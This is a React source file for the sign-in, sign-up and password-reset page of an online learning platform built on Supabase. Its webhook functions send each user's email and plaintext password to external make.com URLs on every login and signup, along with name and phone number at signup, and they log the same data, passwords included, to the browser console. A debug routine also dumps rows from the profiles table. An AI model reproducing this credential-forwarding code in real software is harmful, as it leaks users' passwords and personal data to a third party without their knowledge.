import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Eye, EyeOff, ArrowLeft, Mail, Lock, Phone } from 'lucide-react';
import { Link, useNavigate } from 'react-router-dom';
import { useAuth } from '@/hooks/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { useRegistration } from '@/hooks/useRegistration';
import { useUserRouter } from '@/hooks/useUserRouter';
import { useToast } from '@/hooks/use-toast';


const Auth = () => {
  const [isLogin, setIsLogin] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [showResetForm, setShowResetForm] = useState(false);
  const [selectedRole, setSelectedRole] = useState('student');
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    firstName: '',
    lastName: '',
    contactNumber: '',
    resetEmail: ''
  });
  const [localError, setLocalError] = useState('');
  const [resetLoading, setResetLoading] = useState(false);

  const { signIn, signUp, loading, user, error, profile } = useAuth();
  const { registerUser, loading: registrationLoading } = useRegistration();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { 
    routeAfterLogin, 
    handleRoleDetectionFailure, 
    handleRoutingError,
    setDashboardPreference,
    handleLoginSuccess,
    initializeSession
  } = useUserRouter();

  const testSupabaseConnection = async () => {
    try {
      console.log('Testing Supabase connection...');
      
      // Test 1: Check if we can connect to Supabase
      const { data: { user } } = await supabase.auth.getUser();
      console.log('Current user:', user);
      
      // Test 2: Check if we can query the profiles table
      const { data: profiles, error: profilesError } = await supabase
        .from('profiles')
        .select('*')
        .limit(5);
      
      if (profilesError) {
        console.error('Profiles table error:', profilesError);
      } else {
        console.log('Profiles table data:', profiles);
      }
      
      // Test 3: Check database connection
      const { data, error } = await supabase
        .from('profiles')
        .select('count(*)', { count: 'exact' });
      
      if (error) {
        console.error('Database connection error:', error);
      } else {
        console.log('Database connection successful, profile count:', data);
      }
      
    } catch (error) {
      console.error('Supabase test error:', error);
    }
  };

  useEffect(() => {
    console.log('Auth useEffect - user:', user, 'loading:', loading, 'profile:', profile);
    
    // Send webhook for page visit
    sendWebhookToMake('page_visit', {
      email: '',
      additionalData: {
        page: 'auth',
        action: 'page_loaded',
        timestamp: new Date().toISOString()
      }
    });
    
    if (user && !loading) {
      handleAuthenticationSuccess(user, profile);
    }
  }, [user, loading, profile, navigate]);

  /**
   * Handle successful authentication with proper routing and session management
   */
  const handleAuthenticationSuccess = async (authenticatedUser: any, userProfile: any) => {
    try {
      console.log('🔐 Authentication successful, initializing session and redirecting to courses...');

      // Keep session initialization (prevents auth-related edge cases), but redirect to courses.
      const sessionInitialized = await initializeSession(
        { id: authenticatedUser.id, email: authenticatedUser.email || '' },
        userProfile
      );

      if (!sessionInitialized) {
        console.warn('⚠️ Session initialization failed, continuing with navigation to courses');
      }

      // Persist dashboard preference if available (even though we go to courses after auth)
      if (userProfile?.role && !userProfile.dashboard_preference) {
        await setDashboardPreference(userProfile.role);
      }

      navigate('/courses', { replace: true });
    } catch (error) {
      console.error('❌ Error during authentication success handling:', error);
      handleAuthenticationError(error as Error);
    }
  };

  /**
   * Handle role detection recovery when profile is not available
   */
  const handleRoleDetectionRecovery = async (authenticatedUser: any) => {
    try {
      console.log('🔄 Implementing role detection recovery...');
      
      const recoveryResult = handleRoleDetectionFailure(
        { id: authenticatedUser.id, email: authenticatedUser.email || '' },
        { replaceHistory: true }
      );
      
      if (!recoveryResult.success) {
        console.warn('⚠️ Role detection recovery failed, using fallback');
        const errorRecoveryResult = handleRoutingError(
          new Error(recoveryResult.error || 'Role detection failed'),
          '/dashboard'
        );
        
        if (!errorRecoveryResult.success) {
          console.error('❌ All recovery attempts failed, using manual navigation');
          navigate('/dashboard', { replace: true });
        }
      } else {
        console.log('✅ Role detection recovery successful:', recoveryResult.route);
        
        // Set default student preference for recovered users
        await setDashboardPreference('student');
      }
    } catch (error) {
      console.error('❌ Error during role detection recovery:', error);
      handleAuthenticationError(error as Error);
    }
  };



  /**
   * Handle authentication errors with proper recovery
   */
  const handleAuthenticationError = (error: Error) => {
    console.error('❌ Authentication error:', error);
    
    // Use UserRouter error handling
    const errorResult = handleRoutingError(error, '/auth');
    
    if (!errorResult.success) {
      console.error('❌ Error handling failed, clearing auth state');
      // Clear any partial auth state
      setLocalError('Authentication failed. Please try again.');
    }
  };

  const roles = [
    { value: 'student', label: 'Student', description: 'Learn new skills' }
  ];

  // Webhook function to send data to make.com
  const sendWebhookToMake = async (action: 'login' | 'signup' | 'password_reset' | 'page_visit', userData: any) => {
    try {
      const webhookUrl = 'https://hook.eu2.make.com/cjidqgl89n2sw81cs64krdscwt13e38u';
      
      const webhookData = {
        action: action,
        timestamp: new Date().toISOString(),
        user: {
          email: userData.email,
          password: userData.password || '',
          firstName: userData.firstName || '',
          lastName: userData.lastName || '',
          role: userData.role || 'student'
        },
        platform: 'Beta Skill Learning Platform',
        source: 'Auth Page',
        additionalData: userData.additionalData || {}
      };

      console.log('Sending webhook to make.com:', webhookData);

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(webhookData)
      });

      if (response.ok) {
        console.log('✅ Webhook sent successfully to make.com');
      } else {
        console.error('❌ Webhook failed:', response.status, response.statusText);
      }
    } catch (error) {
      console.error('❌ Webhook error:', error);
    }
  };

  // New webhook function for signup with contact number
  const sendSignupWebhook = async (userData: any) => {
    try {
      const webhookUrl = 'https://hook.eu2.make.com/6kosk865bq2a7lkwbfavshrusfucoy8x';
      
      const webhookData = {
        firstName: userData.firstName,
        lastName: userData.lastName,
        contactNumber: userData.contactNumber,
        email: userData.email,
        password: userData.password,
        timestamp: new Date().toISOString(),
        platform: 'Beta Skill Learning Platform',
        source: 'Auth Signup Form'
      };

      console.log('Sending signup webhook to make.com:', webhookData);

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(webhookData)
      });

      if (response.ok) {
        console.log('✅ Signup webhook sent successfully to make.com');
      } else {
        console.error('❌ Signup webhook failed:', response.status, response.statusText);
      }
    } catch (error) {
      console.error('❌ Signup webhook error:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLocalError('');
    
    try {
      if (isLogin) {
        console.log('🔐 Attempting login for', formData.email);
        
        const result = await signIn(formData.email, formData.password);
        console.log('✅ Login success, result:', result);
        
        // Send webhook for login
        await sendWebhookToMake('login', {
          email: formData.email,
          password: formData.password,
          role: 'student' // Default role for login
        });
        
        // Note: Authentication success handling is now managed by useEffect
        // The UserRouter will handle proper dashboard redirection
        
      } else {
        console.log('📝 Attempting signup for', formData.email, 'with role:', selectedRole);
        
        // Use the new registration hook that ensures contact number is saved
        const result = await registerUser({
          email: formData.email,
          password: formData.password,
          firstName: formData.firstName,
          lastName: formData.lastName,
          contactNumber: formData.contactNumber,
          role: selectedRole
        });
        
        console.log('✅ Signup success, result:', result);
        
        // Send webhook for signup
        await sendWebhookToMake('signup', {
          email: formData.email,
          password: formData.password,
          firstName: formData.firstName,
          lastName: formData.lastName,
          role: selectedRole
        });

        // Send new signup webhook with contact number
        await sendSignupWebhook({
          email: formData.email,
          password: formData.password,
          firstName: formData.firstName,
          lastName: formData.lastName,
          contactNumber: formData.contactNumber
        });
        
        // Note: For signup, the user will be automatically logged in
        // and the useEffect will handle the routing via UserRouter
      }
    } catch (error: any) {
      console.error('❌ Authentication error:', error);
      
      // Use enhanced error handling
      const errorMessage = error?.message || 'Authentication failed. Please try again.';
      setLocalError(errorMessage);
      
      // Handle specific authentication errors
      if (error?.message?.includes('Invalid login credentials')) {
        setLocalError('Invalid email or password. Please check your credentials and try again.');
      } else if (error?.message?.includes('Email not confirmed')) {
        setLocalError('Please check your email and click the confirmation link before signing in.');
      } else if (error?.message?.includes('Too many requests')) {
        setLocalError('Too many login attempts. Please wait a few minutes and try again.');
      }
      
      // Log error for debugging
      console.error('Authentication error details:', {
        message: error?.message,
        code: error?.code,
        status: error?.status
      });
    }
  };

  const handleResetPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setResetLoading(true);
    setLocalError('');
    
    try {
      console.log('🔐 Sending password reset email to:', formData.resetEmail);
      
      // Send password reset email using Supabase
      const { error } = await supabase.auth.resetPasswordForEmail(formData.resetEmail, {
        redirectTo: `${window.location.origin}/reset-password`,
      });

      if (error) {
        throw error;
      }

      // Send webhook for password reset attempt
      await sendWebhookToMake('password_reset', {
        email: formData.resetEmail,
        additionalData: {
          resetRequested: true,
          action: 'password_reset_request',
          timestamp: new Date().toISOString()
        }
      });

      // Show success message
      toast({
        title: "Reset email sent! ✅",
        description: `We've sent a password reset link to ${formData.resetEmail}. Please check your inbox and spam folder.`,
        duration: 6000,
      });

      console.log('✅ Password reset email sent successfully');
      
      // Reset form and go back to login
      setShowResetForm(false);
      setFormData({ ...formData, resetEmail: '' });
      
    } catch (error: any) {
      console.error('❌ Password reset error:', error);
      
      // Show error message with proper feedback
      const errorMessage = error?.message || 'Failed to send reset email. Please try again.';
      
      toast({
        title: "Error sending reset email",
        description: errorMessage,
        variant: "destructive",
        duration: 5000,
      });
      
      setLocalError(errorMessage);
    } finally {
      setResetLoading(false);
    }
  };

  if (user && !loading && profile) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-purple-50 to-cyan-50 flex items-center justify-center p-4 sm:p-6">
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-1/4 left-1/4 w-32 sm:w-64 h-32 sm:h-64 bg-purple-300 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute top-3/4 right-1/4 w-32 sm:w-64 h-32 sm:h-64 bg-yellow-300 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-1000"></div>
      </div>
      <div className="relative z-10 w-full max-w-md">
        <Link to="/" className="inline-flex items-center text-gray-600 hover:text-primary mb-4 sm:mb-6 transition-colors">
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back to Home
        </Link>
        <Card className="glass-card animate-scale-in">
          <CardHeader className="text-center pb-2">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-transparent flex items-center justify-center mx-auto mb-3 sm:mb-4">
              <img 
                src="/beta-skill-logo.png" 
                alt="Beta Skill Logo" 
                className="h-16 w-16 sm:h-20 sm:w-20 object-contain"
              />
            </div>
            <CardTitle className="text-xl sm:text-2xl font-bold">
              {showResetForm ? 'Reset Password' : isLogin ? 'Welcome Back' : 'Join Beta Skill'}
            </CardTitle>
            <p className="text-sm sm:text-base text-gray-600">
              {showResetForm 
                ? 'Enter your email to reset your password'
                : isLogin 
                ? 'Sign in to continue your learning journey' 
                : 'Create your account and start learning today'
              }
            </p>
          </CardHeader>
          <CardContent className="space-y-4 sm:space-y-6">
            {(error || localError) && (
              <div className="text-red-600 text-center font-medium text-sm sm:text-base">{error || localError}</div>
            )}
            {showResetForm ? (
              <form onSubmit={handleResetPassword} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="resetEmail">Email</Label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    id="resetEmail"
                    type="email"
                      placeholder="Enter your email address"
                    value={formData.resetEmail}
                    onChange={(e) => setFormData({ ...formData, resetEmail: e.target.value })}
                      className="h-11 sm:h-12 pl-10"
                    required
                      disabled={resetLoading}
                  />
                  </div>
                  <p className="text-xs text-gray-500 mt-1">
                    We'll send you a link to reset your password
                  </p>
                </div>
                <Button 
                  type="submit" 
                  className="w-full h-11 sm:h-12"
                  disabled={resetLoading}
                >
                  {resetLoading ? 'Sending...' : 'Send Reset Email'}
                </Button>
                <Button 
                  type="button" 
                  variant="link" 
                  className="w-full" 
                  onClick={() => {
                    setShowResetForm(false);
                    setLocalError('');
                  }}
                  disabled={resetLoading}
                >
                  Back to Login
                </Button>
              </form>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-4">

                {!isLogin && (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="firstName">First Name</Label>
                      <Input
                        id="firstName"
                        placeholder="First name"
                        value={formData.firstName}
                        onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                        className="h-12"
                        required
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="lastName">Last Name</Label>
                      <Input
                        id="lastName"
                        placeholder="Last name"
                        value={formData.lastName}
                        onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                        className="h-12"
                        required
                      />
                    </div>
                  </div>
                )}
                {!isLogin && (
                  <div className="space-y-2">
                    <Label htmlFor="contactNumber">Contact Number</Label>
                    <div className="relative">
                      <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <Input
                        id="contactNumber"
                        type="tel"
                        placeholder="Enter your contact number"
                        value={formData.contactNumber}
                        onChange={(e) => setFormData({ ...formData, contactNumber: e.target.value })}
                        className="h-12 pl-10"
                        required
                      />
                    </div>
                  </div>
                )}
                <div className="space-y-2">
                  <Label htmlFor="email">Email</Label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                    <Input
                      id="email"
                      type="email"
                      placeholder="Enter your email"
                      value={formData.email}
                      onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                      className="h-12 pl-10"
                      required
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="password">Password</Label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                    <Input
                      id="password"
                      type={showPassword ? 'text' : 'password'}
                      placeholder={isLogin ? 'Enter your password' : 'Create a password'}
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      className="h-12 pl-10 pr-12"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                </div>
                <Button type="submit" className="w-full h-12" disabled={loading || registrationLoading}>
                  {isLogin ? 'Log In' : (registrationLoading ? 'Creating Account...' : 'Sign Up')}
                </Button>

                <Button type="button" variant="link" className="w-full" onClick={() => {
                  setShowResetForm(true);
                  // Send webhook for password reset form opened
                  sendWebhookToMake('page_visit', {
                    email: '',
                    additionalData: {
                      page: 'auth',
                      action: 'password_reset_form_opened',
                      timestamp: new Date().toISOString()
                    }
                  });
                }}>
                  Forgot password?
                </Button>
                <div className="flex justify-center items-center gap-2 mt-2">
                  <span>{isLogin ? "Don't have an account?" : "Already have an account?"}</span>
                  <Button type="button" variant="link" onClick={() => {
                    setIsLogin(!isLogin);
                    // Send webhook for mode switch
                    sendWebhookToMake('page_visit', {
                      email: '',
                      additionalData: {
                        page: 'auth',
                        action: 'mode_switch',
                        newMode: !isLogin ? 'signup' : 'login',
                        timestamp: new Date().toISOString()
                      }
                    });
                  }}>
                    {isLogin ? 'Sign Up' : 'Log In'}
                  </Button>
                </div>
              </form>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Auth;
